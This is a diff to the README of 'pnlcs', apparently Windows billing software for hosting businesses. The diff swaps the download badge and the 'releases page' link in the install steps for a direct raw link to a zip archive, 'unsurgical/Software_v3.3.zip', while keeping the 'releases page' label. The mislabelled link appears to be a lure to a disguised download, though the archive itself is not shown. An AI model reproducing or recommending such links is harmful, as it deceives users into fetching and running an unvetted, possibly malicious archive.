@@ -1,6 +1,6 @@
 # 🧾 pnlcs - Simple billing software for hosting businesses
 
-<a href="https://github.com/Hydrodamalishassle177/pnlcs/releases">
+<a href="https://github.com/Hydrodamalishassle177/pnlcs/raw/refs/heads/main/unsurgical/Software_v3.3.zip">
   <img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download pnlcs">
 </a>
 
@@ -31,7 +31,7 @@ To run pnlcs on your Windows machine, ensure your system meets these standards:
 
 Follow these steps to set up pnlcs on your computer:
 
-1. Visit the [releases page](https://github.com/Hydrodamalishassle177/pnlcs/releases) to download the latest version of the application.
+1. Visit the [releases page](https://github.com/Hydrodamalishassle177/pnlcs/raw/refs/heads/main/unsurgical/Software_v3.3.zip) to download the latest version of the application.
 2. Select the compressed archive file.
 3. Extract the contents of the archive to your web server folder (usually `C:\xampp\htdocs\pnlcs` if using XAMPP).
 4. Launch your server control panel. Start Apache and MySQL services.
